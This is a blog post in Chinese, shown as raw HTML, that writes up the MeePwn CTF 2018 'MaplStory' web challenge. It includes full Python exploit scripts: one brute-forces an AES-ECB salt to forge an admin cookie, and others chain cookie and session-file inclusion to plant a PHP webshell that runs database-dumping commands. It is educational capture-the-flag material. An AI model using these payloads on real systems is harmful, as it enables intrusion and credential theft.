<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Meepwn2018：MaplStory——以Cookie为跳板的Session文件包含 | 闲言语</title><meta name=keywords content><meta name=description content="本文首发 先知社区 ，转载请注明链接。
本题考察PHP源码审计。主要有两个缺陷：使用ECB模式进行AES加密导致的CPA（选择明文攻击）和 文件包含。有两处可以向文件写入内容以供包含，但均被过滤，最终通过以未被过滤的Cookie为跳板连接两处文件包含来写入Shell。文末还介绍了一种深入利用一处文件包含getshell的解法。
概览 打开 http://178.128.87.16 是一个登陆页面，注册账户后有四个页面，HOME 是欢迎页，CHARACTER 页可以和宠物角色互动，但账户刚注册完是没有宠物的，需要获取ADMIN权限后自行添加， SETTING 页可以修改用户名和选择头像，GAME 页是一个Flash小游戏，和本题无关。
题目提供了源码下载，可以从 这里 或 备用地址 下载。
文件包含 index.php index.php 文件中有如下语句，显然存在文件包含。
1 2 3 4 if(isset($_GET['page']) && !empty($_GET['page'])) { include($_GET['page']); } 但所有 GET 和POST 提交的参数都会被删除掉敏感字符串，其中 // 、(.+) 和 `` 是比较值得注意的。
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 function bad_words($value) { //My A.I TsuGo show me that when player using these words below they feel angry, so i decide to censor them."><meta name=author content><link rel=canonical href=https://ret2neo.cn/post/180721meepwnmaplstory/><link crossorigin=anonymous href=/assets/css/stylesheet.42b1e004fb78db2fc933d33c9db659598f62453f0de6f9db50c85e5936c0d8c3.css integrity="sha256-QrHgBPt42y/JM9M8nbZZWY9iRT8N5vnbUMheWTbA2MM=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://ret2neo.cn/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://ret2neo.cn/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://ret2neo.cn/favicon-32x32.png><link rel=apple-touch-icon href=https://ret2neo.cn/apple-touch-icon.png><link rel=mask-icon href=https://ret2neo.cn/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Meepwn2018：MaplStory——以Cookie为跳板的Session文件包含"><meta property="og:description" content="本文首发 先知社区 ，转载请注明链接。
本题考察PHP源码审计。主要有两个缺陷：使用ECB模式进行AES加密导致的CPA（选择明文攻击）和 文件包含。有两处可以向文件写入内容以供包含，但均被过滤，最终通过以未被过滤的Cookie为跳板连接两处文件包含来写入Shell。文末还介绍了一种深入利用一处文件包含getshell的解法。
概览 打开 http://178.128.87.16 是一个登陆页面，注册账户后有四个页面，HOME 是欢迎页，CHARACTER 页可以和宠物角色互动，但账户刚注册完是没有宠物的，需要获取ADMIN权限后自行添加， SETTING 页可以修改用户名和选择头像，GAME 页是一个Flash小游戏，和本题无关。
题目提供了源码下载，可以从 这里 或 备用地址 下载。
文件包含 index.php index.php 文件中有如下语句，显然存在文件包含。
1 2 3 4 if(isset($_GET['page']) && !empty($_GET['page'])) { include($_GET['page']); } 但所有 GET 和POST 提交的参数都会被删除掉敏感字符串，其中 // 、(.+) 和 `` 是比较值得注意的。
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 function bad_words($value) { //My A.I TsuGo show me that when player using these words below they feel angry, so i decide to censor them."><meta property="og:type" content="article"><meta property="og:url" content="https://ret2neo.cn/post/180721meepwnmaplstory/"><meta property="article:section" content="post"><meta property="article:published_time" content="2018-07-21T03:43:44+08:00"><meta property="article:modified_time" content="2018-07-21T03:43:44+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Meepwn2018：MaplStory——以Cookie为跳板的Session文件包含"><meta name=twitter:description content="本文首发 先知社区 ，转载请注明链接。
本题考察PHP源码审计。主要有两个缺陷：使用ECB模式进行AES加密导致的CPA（选择明文攻击）和 文件包含。有两处可以向文件写入内容以供包含，但均被过滤，最终通过以未被过滤的Cookie为跳板连接两处文件包含来写入Shell。文末还介绍了一种深入利用一处文件包含getshell的解法。
概览 打开 http://178.128.87.16 是一个登陆页面，注册账户后有四个页面，HOME 是欢迎页，CHARACTER 页可以和宠物角色互动，但账户刚注册完是没有宠物的，需要获取ADMIN权限后自行添加， SETTING 页可以修改用户名和选择头像，GAME 页是一个Flash小游戏，和本题无关。
题目提供了源码下载，可以从 这里 或 备用地址 下载。
文件包含 index.php index.php 文件中有如下语句，显然存在文件包含。
1 2 3 4 if(isset($_GET['page']) && !empty($_GET['page'])) { include($_GET['page']); } 但所有 GET 和POST 提交的参数都会被删除掉敏感字符串，其中 // 、(.+) 和 `` 是比较值得注意的。
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 function bad_words($value) { //My A.I TsuGo show me that when player using these words below they feel angry, so i decide to censor them."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://ret2neo.cn/post/"},{"@type":"ListItem","position":2,"name":"Meepwn2018：MaplStory——以Cookie为跳板的Session文件包含","item":"https://ret2neo.cn/post/180721meepwnmaplstory/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Meepwn2018：MaplStory——以Cookie为跳板的Session文件包含","name":"Meepwn2018：MaplStory——以Cookie为跳板的Session文件包含","description":"本文首发 先知社区 ，转载请注明链接。\n本题考察PHP源码审计。主要有两个缺陷：使用ECB模式进行AES加密导致的CPA（选择明文攻击）和 文件包含。有两处可以向文件写入内容以供包含，但均被过滤，最终通过以未被过滤的Cookie为跳板连接两处文件包含来写入Shell。文末还介绍了一种深入利用一处文件包含getshell的解法。\n概览 打开 http://178.128.87.16 是一个登陆页面，注册账户后有四个页面，HOME 是欢迎页，CHARACTER 页可以和宠物角色互动，但账户刚注册完是没有宠物的，需要获取ADMIN权限后自行添加， SETTING 页可以修改用户名和选择头像，GAME 页是一个Flash小游戏，和本题无关。\n题目提供了源码下载，可以从 这里 或 备用地址 下载。\n文件包含 index.php index.php 文件中有如下语句，显然存在文件包含。\n1 2 3 4 if(isset($_GET[\u0026#39;page\u0026#39;]) \u0026amp;\u0026amp; !empty($_GET[\u0026#39;page\u0026#39;])) { include($_GET[\u0026#39;page\u0026#39;]); } 但所有 GET 和POST 提交的参数都会被删除掉敏感字符串，其中 // 、(.+) 和 `` 是比较值得注意的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 function bad_words($value) { //My A.I TsuGo show me that when player using these words below they feel angry, so i decide to censor them.","keywords":[],"articleBody":"本文首发 先知社区 ，转载请注明链接。\n本题考察PHP源码审计。主要有两个缺陷：使用ECB模式进行AES加密导致的CPA（选择明文攻击）和 文件包含。有两处可以向文件写入内容以供包含，但均被过滤，最终通过以未被过滤的Cookie为跳板连接两处文件包含来写入Shell。文末还介绍了一种深入利用一处文件包含getshell的解法。\n概览 打开 http://178.128.87.16 是一个登陆页面，注册账户后有四个页面，HOME 是欢迎页，CHARACTER 页可以和宠物角色互动，但账户刚注册完是没有宠物的，需要获取ADMIN权限后自行添加， SETTING 页可以修改用户名和选择头像，GAME 页是一个Flash小游戏，和本题无关。\n题目提供了源码下载，可以从 这里 或 备用地址 下载。\n文件包含 index.php index.php 文件中有如下语句，显然存在文件包含。\n1 2 3 4 if(isset($_GET['page']) \u0026\u0026 !empty($_GET['page'])) { include($_GET['page']); } 但所有 GET 和POST 提交的参数都会被删除掉敏感字符串，其中 // 、(.+) 和 `` 是比较值得注意的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 function bad_words($value) { //My A.I TsuGo show me that when player using these words below they feel angry, so i decide to censor them. //Maybe some word is false positive but pls accept it, for a no-cancer gaming environment! $too_bad=\"/(fuck|bakayaro|ditme|bitch|caonima|idiot|bobo|tanga|pin|gago|tangina|\\/\\/|damn|noob|pro|nishigou|stupid|ass|\\(.+\\)|`.+`|vcl|cyka|dcm)/is\"; $value = preg_replace($too_bad, str_repeat(\"*\",3) ,$value); return $value; } foreach($_GET as $key=\u003e$value) { if (is_array($value)){mapl_die();} $value=bad_words($value); $_GET[$key]=$value; } foreach($_POST as $key2=\u003e$value2) { if (is_array($value2)){mapl_die();} $value2=bad_words($value2); $_POST[$key2]=$value2; } PHP使用PHPSESSID cookie值 存储会话标识，一般在/var/lib/php/sessions/sess_ 文件里写有一些有特定意义的字符串，其中 可在Cookie里找到。尝试读取SESSION文件：\n1 http://178.128.87.16/index.php?page=/var/lib/php/sessions/sess_8es749ivbfetvsmsc0ggthr2e5 其中是序列化后的$_SESSION 和明文的操作记录，这些内容在后面会大有用处。\nCPA猜解salt login.php 阅读login.php 并跟入相关文件，可以看到有多处用到$salt 变量，其地位非常关键。\n首先是从单独的表mapl_config 中读出值。\n1 2 3 4 5 6 7 8 9 10 $configRow=config_connect($conn); $salt=$configRow['mapl_salt']; $key=$configRow['mapl_key']; /* function config_connect($conn) { $config=mysqli_query($conn,\"SELECT * FROM mapl_config\"); return mysqli_fetch_array($config); } */ 如果登陆成功就将用户名和邮箱加盐加密存储的$_SESSION 变量里。并且将admin /user 字符串加盐加密存储在$_COOKIE['_role'] 变量中，用以标识用户身份。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 if( $count === 1 \u0026\u0026 $row['userPass']===$password ) //登陆成功 { $secure_email=encryptData($row['userEmail'],$salt,$key); $secure_name=encryptData($row['userName'],$salt,$key); $log_content='['.date(\"h:i:sa\").' GMT+7] Logged In'; $_SESSION['character_name'] = $secure_name; $_SESSION['user'] = $secure_email; $_SESSION['action']=$log_content; if ($row['userIsAdmin']==='1') { $data='admin'.$salt; $role=hash('sha256', $data); setcookie('_role',$role); } else { $data='user'.$salt; $role=hash('sha256', $data); setcookie('_role',$role);\t} header(\"Location: ?page=home.php\"); } /* function encryptData($data,$salt,$key) { $encrypt=openssl_encrypt($data.$salt,\"AES-128-ECB\",$key); $raw=base64_decode($encrypt); $final=implode(unpack(\"H*\", $raw)); return $final; } */ setting.php 再查看setting.php ，这个文件实现了修改用户名页面的功能 。只要修改后的名字不长于22个字符，就使用mysqli_real_escape_string 处理并更新记录（避免SQL注入）。会被编码的字符有的 NUL（ASCII 0）、\\n、\\r、\\、’、\" 和 Control-Z。\n1 2 3 4 5 6 7 8 9 10 11 if(strlen($_POST['name'])\u003c=22){ $name=mysqli_real_escape_string($conn,$_POST['name']); $query=\"UPDATE users SET userName='$name' WHERE userEmail='$mail'\"; $res2=mysqli_query($conn,$query); $userRow2=mysqli_fetch_array($res2); $secure_name=encryptData($name,$salt,$key); $_SESSION['character_name'] = $secure_name; $log_content='['.date(\"h:i:sa\").' GMT+7] Change character name'; $_SESSION['action']=$log_content; header(\"Refresh:0\"); } 所有加密操作用的是同一个$salt ，加上上述包含Session文件的操作，就会有构造任意明文获取对应密文的可能。最重要的，加密方式采用了AES-128-ECB ，ECB 全称Electronic Codebook （电码本），顾名思义，这种模式的特点就是相同的明文块加密后会得到相同的密文块。\n这里采用128位的分组形式，也就是每十六字节一个明文块。举栗说明：\n如果用户名是findneo 七个字节，$salt 是xianzhi 八个字节，那么加密过程就是把findneoxianzhi 共十五个字节作为一个分组去加密，缺一个字节按算法padding。\n如果用户名是hifindneo 共九个字节，那么加密过程就是对hifindne 和oxianzhi 作为两个分组加密。\n我们可以在SETTING 页面修改用户名来改变明文，然后使用文件包含读到Session文件内容来获取密文，这就是一个完整的选择明文攻击过程。\n利用 怎么攻击呢？比如用户名是findneo ，（我们还不知道$salt 是xianzhi ） ，那么加密的第一个明文分组是findneox ，记录下$_SESSION['character_name'] 的前32个字节十六进制数，也就是密文的第一个分组。\n然后依次改变用户名为findneoa 、findneob 、.etc，并记录密文第一个分组。直到用户名为findneox 时发现密文第一个分组与用户名为findneo 时的相同。根据ECB模式的特点，就能知道$salt 的第一个字节为x ，事实上也确实如此。\n测试发现用户名长15个字符时，$_SESSION['character_name'] 有64字节十六进制数，也就是加盐加密后是32个字符，用户名长为16个字符时，$_SESSION['character_name'] 有96字节，也就加盐加密后有48个字符。这说明$salt 长为16个字节。\n然后就可以按照以上原理猜解$salt ，伪造$_COOKIE['_role'] ，成为管理员。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 # -*- coding: utf-8 -*- # by https://findneo.github.io/ import requests from bs4 import BeautifulSoup import string import hashlib url = \"http://178.128.87.16/\" cookie = dict( PHPSESSID='t9p07a1qt2plbcqp8tpkib4794', # _role='8e1c59c3fdd69afbc97fcf4c960aa5c5e919e7087c07c91cf690add608236cbe' ) def read_sess(): r = requests.get( url + \"?page=/var/lib/php/sessions/sess_\" + cookie['PHPSESSID'], cookies=cookie) return r.content def get_sess_character_name(): \"\"\"read_sess(): character_name|s:64:\"6269cb047bbbd0802cd7b882700591c6f6ace10234be4243997282e7c467e820\"; user|s:64:\"82f0cac5c0591592eaccfdac48f3e3656c264c7a73f97aeea603461254e3ac38\"; action|s:40:\"[12:04:21pm GMT+7] Change character name\"; \"\"\" character_name = read_sess().split(';')[0].split(\":\")[-1][1:-1] return character_name def change_name(character_name): payload = dict(name=character_name, submit='Edit') r = requests.post(url + \"?page=setting.php\", cookies=cookie, data=payload) def whoami(): r = requests.get(url + \"?page=home.php\", cookies=cookie) s = BeautifulSoup(r.content, 'lxml') print s.h2.get_text().split('\\n')[0] def change_and_check(name): change_name(name) # whoami() return get_sess_character_name() def crack_salt(): junk = 'x' * 16 salt = '' s = 'ms_g00d_0ld_g4m3' + string.printable for i in range(15, -1, -1): cmp = change_and_check(junk[:i])[:32] if i == 0: # 如果i==0，无法修改用户名，实际上salt对应的就是第二个密文块，直接取即可 cmp = change_and_check(junk)[32:64] for j in s: if cmp == change_and_check(junk[:i] + salt + j)[:32]: salt += j print salt break return salt salt = crack_salt() 爆破得到$salt 为ms_g00d_0ld_g4m3 ，然后计算出admin 用户的Cookie为 hashlib.sha256('admin' + salt).hexdigest() 也就是_role='a2ae9db7fd12a8911be74590b99bc7ad1f2f6ccd2e68e44afbf1280349205054' 。\n可使用Fiddler的Filters功能设置请求头为PHPSESSID=8es749ivbfetvsmsc0ggthr2e5; _role=8e1c59c3fdd69afbc97fcf4c960aa5c5e919e7087c07c91cf690add608236cbe ，权限上升为ADMIN。\n以Cookie为跳板的Session文件包含 admin.php 注意到Session文件中有部分明文信息，记录关于上一次的操作。每一次操作都会记录，但只有admin.php 中写入的内容存在可控变量：\n1 2 3 4 5 6 7 8 9 10 if ( isset($_POST['pet']) \u0026\u0026 !empty($_POST['pet']) \u0026\u0026 isset($_POST['email']) \u0026\u0026 !empty($_POST['email']) ) { $dir='./upload/'.md5($salt.$_POST['email']).'/'; give_pet($dir,$_POST['pet']); if(check_available_pet($_POST['pet'])) { $log_content='['.date(\"h:i:sa\").' GMT+7] gave '.$_POST['pet'].' to player '.search_name_by_mail($conn,$_POST['email']); $_SESSION['action']=$log_content; } } 其中的search_name_by_mail($conn,$_POST['email']) 正是用户名，而这是可修改的。所以只要在CHARACTER 页面执行一次送宠物给某个用户的操作，Session文件中就会出现该用户的用户名。而如果用户名是PHP代码，就会被执行。\n用户名修改有哪些限制？\n首先是文件包含 小节提到的所有GET ，POST 参数都必须经过的黑名单过滤。\n1 2 3 4 5 function bad_words($value){\t$too_bad=\"/(fuck|bakayaro|ditme|bitch|caonima|idiot|bobo|tanga|pin|gago|tangina|\\/\\/|damn|noob|pro|nishigou|stupid|ass|\\(.+\\)|`.+`|vcl|cyka|dcm)/is\"; $value = preg_replace($too_bad, str_repeat(\"*\",3) ,$value); return $value; } # |\\/\\/|\\(.+\\)|`.+`| 比较重要，意味着伪协议、函数、shell都不能直接使用。 然后是setting.php （代码见CPA猜解salt 小节）中要求的不大于22个字符。\ncharacter.php 所有功能中唯一一个直接写文件的操作在和CHARACTER 页面，同样需经过黑名单过滤，并且要求小于20个字符。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 if(isset($_POST['command']) \u0026\u0026 !empty($_POST['command'])) { if(strlen($_POST['command'])\u003e=20) { echo 'Too Long'; } else { save_command($mail,$salt,$_POST['command']); header(\"Refresh:0\"); } } /* function save_command($email,$salt,$data){ $dir='./upload/'.md5($salt.$email); file_put_contents($dir.'/command.txt', $data); } */ 利用 思路 全局共有两处可以修改文件，可以修改用户名以修改Session文件，也可在CHARACTER 页面修改command.txt ，但两处都是由GET 或POST 传的参，参数被黑名单过滤导致无法直接发挥作用。\n考虑到COOKIE没有被过滤，可以用作跳板，在Session文件中包含Cookie，在command.txt 写入编码后的无害字符串，在Cookie写入利用伪协议读取 command.txt 并解码的语句，就成功向Session文件写入了一句话。\n其实从哪个文件经由哪个变量跳到哪个文件是有多种可能的，但本题受限于长度这很可能是唯一的解法。\n步骤 在SETTING处修改用户名为\u003c?=include\"$_COOKIE[a] 在Fiddler的Filters处的Cookie后面添加上一条a=php://filter/convert.base64-decode/resource=upload/ac8d37347a056bad2a852e4ef40de28a/command.txt 在character处给宠物发一条命令 PD89YCRfR0VUW2ZdYDs 从而写入command.txt 1 # PD89YCRfR0VUW2ZdYDs 可解码为 \u003c?=`$_GET[f]`; 在admin处给自己送一只宠物 使执行语句\n1 $log_content='['.date(\"h:i:sa\").' GMT+7] gave '.$_POST['pet'].' to player '.search_name_by_mail($conn,$_POST['email']); 而其中的search_name_by_mail($conn,$_POST['email'] 正是用户名\u003c?=include\"$_COOKIE[a]\n所以包含session文件就可以把Cookie里的变量a 包含进来，而a又是command.txt解码后的结果，也就是一句话木马。这时就可以以f为密码传入任意命令了。\n读到数据库配置文件 读到配置文件dbconnect.php 1 2 3 4 5 6 7 8 9 \u003c?php define('DBHOST', 'localhost'); define('DBUSER', 'mapl_story_user'); define('DBPASS', 'tsu_tsu_tsu_tsu'); define('DBNAME', 'mapl_story'); $conn = mysqli_connect(DBHOST,DBUSER,DBPASS,DBNAME); if ( !$conn ) { die(\"Connection failed : \" . mysql_error()); } 然后执行命令 1 2 3 echo 'SELECT * FROM mapl_config;'| mysql -umapl_story_user -ptsu_tsu_tsu_tsu mapl_story 或 mysql -e'select * from mapl_config' -umapl_story_user -ptsu_tsu_tsu_tsu mapl_story 脚本 也可参考脚本理清利用过程：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 # -*- coding: utf-8 -*- # by https://findneo.github.io/ import requests, hashlib, base64 def change_name(character_name): payload = dict(name=character_name, submit='Edit') r = requests.post(url + \"?page=setting.php\", cookies=cookie, data=payload) def give_pet(user_email): payload = dict(pet=\"babydragon\", email=user_email, submit=\"Give\") r = requests.post(url + '?page=admin.php', cookies=cookie, data=payload) return r.content def command(cmd=\"testcmd\"): payload = dict(command=cmd, submit=\"Send\") r = requests.post( url + \"?page=character.php\", cookies=cookie, data=payload) def shell(cmd='uname'): payload = dict( page=\"/var/lib/php/sessions/sess_\" + cookie['PHPSESSID'], f=cmd) r = requests.get(url, cookies=cookie, params=payload) return r.content # edit your cookie['PHPSESSID'] \u0026 user_email to run this script url = \"http://178.128.87.16/\" user_email = \"ojbk@qq.com\" salt = 'ms_g00d_0ld_g4m3' cookie = dict( PHPSESSID='8es749ivbfetvsmsc0ggthr2e5', _role='a2ae9db7fd12a8911be74590b99bc7ad1f2f6ccd2e68e44afbf1280349205054', a=\"php://filter/convert.base64-decode/resource=upload/%s/command.txt\" % hashlib.md5(salt + user_email).hexdigest()) change_name('\u003c?=include\"$_COOKIE[a]') # 修改用户名使读Session文件时包含进Cookie['a']，即command.txt得base64解码 cmd = base64.b64encode(\"\u003c?=`$_GET[f]`;\") #'PD89YCRfR0VUW2ZdYDs=' command(cmd[:19]) # 往command.txt写入base64编码的shell，缺少最后一个等号也可正常解码 give_pet(user_email) # 使Session文件中的action值为\"Give $pet to player $username\" cmd = \"mysql -e'select * from mapl_config' -umapl_story_user -ptsu_tsu_tsu_tsu mapl_story\" print shell(cmd) # mapl_salt mapl_key mapl_now_get_your_flag # ms_g00d_0ld_g4m3 You_Never_Guess_This_Tsug0d_1337 MeePwnCTF{__Abus1ng_SessioN_Is_AlwAys_C00L_1337!___} 另一种思路：拼接$_SESSION 变量 另外， 这篇文章 里提供的一种拼接$_SESSION 变量的做法虽不比前者综合利用多处缺陷的优雅，但最大化地利用了单点的缺陷，很有创意，值得学习。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 # -*- coding: utf-8 -*- # by https://findneo.github.io/ import requests, hashlib, base64 def change_name(character_name): payload = dict(name=character_name, submit='Edit') r = requests.post(url + \"?page=setting.php\", cookies=cookie, data=payload) def give_pet(user_email): payload = dict(pet=\"babydragon\", email=user_email, submit=\"Give\") r = requests.post(url + '?page=admin.php', cookies=cookie, data=payload) return r.content def shell(cmd='uname'): payload = dict( page=\"/var/lib/php/sessions/sess_\" + cookie['PHPSESSID'], f=cmd) r = requests.get(url, cookies=cookie, params=payload) return r.content # edit your cookie['PHPSESSID'] \u0026 user_email to run this script url = \"http://178.128.87.16/\" user_email = \"mapl@qq.com\" salt = 'ms_g00d_0ld_g4m3' cookie = dict( PHPSESSID='8es749ivbfetvsmsc0ggthr2e5', _role='a2ae9db7fd12a8911be74590b99bc7ad1f2f6ccd2e68e44afbf1280349205054', ) def do(s): change_name(s) give_pet(user_email) print s print shell() payload1 = \"\"\" \u003c?=$_SESSION[a]='*/'?\u003e \u003c?=$_SESSION[a].=';'?\u003e \u003c?=$_SESSION[a].='\"'?\u003e \u003c?=$_SESSION[a].='\u003c'?\u003e \u003c?=$_SESSION[a].='?'/* \u003c?=$_SESSION[a].='='/* \u003c?=$_SESSION[a].=' '/* \"\"\" payload2 = '`echo PD89YCRfR0VUWzFdYDsK|base64 -d \u003e\u003e upload/%s/command.txt`' % hashlib.md5( salt + user_email).hexdigest() payload3 = \"\"\" \u003c?=$_SESSION[a].=''/* \u003c?=$_SESSION[a].='?'/* \u003c?=$_SESSION[a].='\u003e'/* \u003c?=$_SESSION[a]?\u003e \"\"\" def xxx(): for p in payload1.split('\\n')[1:-1]: do(p) for c in payload2: p = \"\u003c?=$_SESSION[a].='%s'/*\" % c do(p) for p in payload3.split('\\n')[1:-1]: do(p) xxx() print hashlib.md5(salt + user_email).hexdigest() # 可通过运行结果理解payload的巧妙 # 结果存放在 # https://github.com/findneo/ctfgodown/blob/master/20180718-Meepwn%20CTF%20Quals%202018/WEB/maplStory_SESSION_CONCAT_result.txt # shell at # http://178.128.87.16/?page=upload/e500ec6d3d2b69fda8ff11b5b53b5ee2/command.txt\u00261=ls 参考链接 https://ctftime.org/writeup/10418\nMeePwn CTF 2018 Qual - Maple Story\n","wordCount":"1215","inLanguage":"en","datePublished":"2018-07-21T03:43:44+08:00","dateModified":"2018-07-21T03:43:44+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://ret2neo.cn/post/180721meepwnmaplstory/"},"publisher":{"@type":"Organization","name":"闲言语","logo":{"@type":"ImageObject","url":"https://ret2neo.cn/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://ret2neo.cn/ accesskey=h title="闲言语 (Alt + H)">闲言语</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://ret2neo.cn/mind/ title=随笔><span>随笔</span></a></li><li><a href=https://ret2neo.cn/about title=关于><span>关于</span></a></li><li><a href=https://ret2neo.cn/search title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>Meepwn2018：MaplStory——以Cookie为跳板的Session文件包含</h1><div class=post-meta><span title='2018-07-21 03:43:44 +0800 CST'>July 21, 2018</span>&nbsp;|&nbsp;<a href=https://github.dev/findneo/priblog/content/post/180721meepwnmaplstory.md rel="noopener noreferrer" target=_blank>edit</a></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>目录</span></summary><div class=inner><ul><li><a href=#%e6%a6%82%e8%a7%88 aria-label=概览>概览</a></li><li><a href=#%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab aria-label=文件包含>文件包含</a><ul><li><a href=#indexphp aria-label=index.php>index.php</a></li></ul></li><li><a href=#cpa%e7%8c%9c%e8%a7%a3salt aria-label=CPA猜解salt>CPA猜解salt</a><ul><li><a href=#loginphp aria-label=login.php>login.php</a></li><li><a href=#settingphp aria-label=setting.php>setting.php</a></li><li><a href=#%e5%88%a9%e7%94%a8 aria-label=利用>利用</a></li></ul></li><li><a href=#%e4%bb%a5cookie%e4%b8%ba%e8%b7%b3%e6%9d%bf%e7%9a%84session%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab aria-label=以Cookie为跳板的Session文件包含>以Cookie为跳板的Session文件包含</a><ul><li><a href=#adminphp aria-label=admin.php>admin.php</a></li><li><a href=#characterphp aria-label=character.php>character.php</a></li><li><a href=#%e5%88%a9%e7%94%a8-1 aria-label=利用>利用</a><ul><li><a href=#%e6%80%9d%e8%b7%af aria-label=思路>思路</a></li><li><a href=#%e6%ad%a5%e9%aa%a4 aria-label=步骤>步骤</a></li><li><a href=#%e8%84%9a%e6%9c%ac aria-label=脚本>脚本</a></li></ul></li></ul></li><li><a href=#%e5%8f%a6%e4%b8%80%e7%a7%8d%e6%80%9d%e8%b7%af%e6%8b%bc%e6%8e%a5_session-%e5%8f%98%e9%87%8f aria-label="另一种思路：拼接$_SESSION 变量">另一种思路：拼接<code>$_SESSION</code> 变量</a></li><li><a href=#%e5%8f%82%e8%80%83%e9%93%be%e6%8e%a5 aria-label=参考链接>参考链接</a></li></ul></div></details></div></aside><script>let activeElement,elements;window.addEventListener("DOMContentLoaded",function(){checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),activeElement=elements[0];const t=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active")},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{activeElement=Array.from(elements).find(e=>{if(getOffsetTop(e)-window.pageYOffset>0&&getOffsetTop(e)-window.pageYOffset<window.innerHeight/2)return e})||activeElement,elements.forEach(e=>{const t=encodeURI(e.getAttribute("id")).toLowerCase();e===activeElement?document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active"):document.querySelector(`.inner ul li a[href="#${t}"]`).classList.remove("active")})},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><p><strong>本文首发 <a 